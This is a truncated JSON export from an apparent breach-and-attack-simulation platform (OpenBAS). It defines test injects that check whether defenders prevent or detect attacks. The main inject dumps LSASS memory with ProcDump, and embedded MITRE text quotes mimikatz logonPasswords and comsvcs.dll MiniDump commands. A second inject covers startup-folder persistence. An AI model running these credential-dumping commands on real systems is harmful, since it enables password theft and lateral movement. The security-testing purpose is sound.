          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/Procdump.zip",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump_zip_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump_zip_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/Procdump.zip",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/Procdump",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump\\Procdump_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump\\Procdump_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/Procdump/Procdump.exe",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "5ac2b6c0-7e6a-4f6d-b97c-fbf9a6401e24",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "5ac2b6c0-7e6a-4f6d-b97c-fbf9a6401e24",
      "injector_contract_labels" : {
        "en" : "Dump LSASS.exe Memory using ProcDump",
        "fr" : "Dump LSASS.exe Memory using ProcDump"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Dump LSASS.exe Memory using ProcDump\",\"fr\":\"Dump LSASS.exe Memory using ProcDump\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"output_file\",\"label\":\"output_file\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"C:\\\\Windows\\\\Temp\\\\lsass_dump.dmp\",\"type\":\"text\"},{\"key\":\"procdump_exe\",\"label\":\"procdump_exe\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\procdump.exe\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Procdump_zip_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Procdump_zip_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/Procdump.zip\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Procdump_zip_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Procdump_zip_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/Procdump.zip\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Procdump_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Procdump_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/Procdump\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Procdump\\\\Procdump_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Procdump\\\\Procdump_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/Procdump/Procdump.exe\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"5ac2b6c0-7e6a-4f6d-b97c-fbf9a6401e24\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "d3f5b752-b601-4122-a456-6b02e5270a88",
        "payload_type" : "Command",
        "payload_name" : "Dump LSASS.exe Memory using ProcDump",
        "payload_description" : "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "4190cfcc-2763-46cf-a647-ca328122dfa1",
          "attack_pattern_name" : "LSASS Memory",
          "attack_pattern_description" : "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\nSimilar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
          "attack_pattern_external_id" : "T1003.001",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "447bbaf6-82da-4c43-90c8-713bd6117a85",
            "phase_external_id" : "TA0006",
            "phase_stix_id" : "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
            "phase_name" : "Credential Access",
            "phase_shortname" : "credential-access",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "phase_order" : 7
          } ]
        } ],
        "payload_cleanup_executor" : "cmd",
        "payload_cleanup_command" : "del \"#{output_file}\" >nul 2> nul\n",
        "payload_elevation_required" : true,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "output_file",
          "default_value" : "C:\\Windows\\Temp\\lsass_dump.dmp",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "procdump_exe",
          "default_value" : "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump_zip_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/Procdump.zip",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump_zip_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/Procdump.zip",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/Procdump",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump\\Procdump_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/Procdump/Procdump.exe",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "psh",
          "get_command" : "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\Procdump.zip\"\nExpand-Archive \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\Procdump.zip\" \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{procdump_exe}\") -Force | Out-Null\nCopy-Item \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\Procdump\\Procdump.exe\" \"#{procdump_exe}\" -Force\n",
          "check_command" : "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n",
          "description" : "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n"
        } ],
        "payload_external_id" : "0be2230c-9ab3-4ac2-8826-3199b9a0ebf8",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:33.640792Z",
        "payload_updated_at" : "2025-07-03T14:49:44.036577Z",
        "command_executor" : "cmd",
        "command_content" : "\"#{procdump_exe}\" -accepteula -ma lsass.exe #{output_file}\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:33.653729Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:33.653729Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "4190cfcc-2763-46cf-a647-ca328122dfa1",
        "attack_pattern_name" : "LSASS Memory",
        "attack_pattern_description" : "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\nSimilar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
        "attack_pattern_external_id" : "T1003.001",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "447bbaf6-82da-4c43-90c8-713bd6117a85",
          "phase_external_id" : "TA0006",
          "phase_stix_id" : "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
          "phase_name" : "Credential Access",
          "phase_shortname" : "credential-access",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
          "phase_order" : 7
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "66bdfe7a-9b5b-4bd4-b30a-c30dbfb15985",
    "inject_title" : "Create shortcut to cmd in startup folders",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 780,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Create shortcut to cmd in startup folders",
          "fr" : "Create shortcut to cmd in startup folders"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "471dd284-1ced-4ff1-bddd-1c6e685a5e5d",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "471dd284-1ced-4ff1-bddd-1c6e685a5e5d",
      "injector_contract_labels" : {
        "en" : "Create shortcut to cmd in startup folders",
        "fr" : "Create shortcut to cmd in startup folders"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Create shortcut to cmd in startup folders\",\"fr\":\"Create shortcut to cmd in startup folders\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 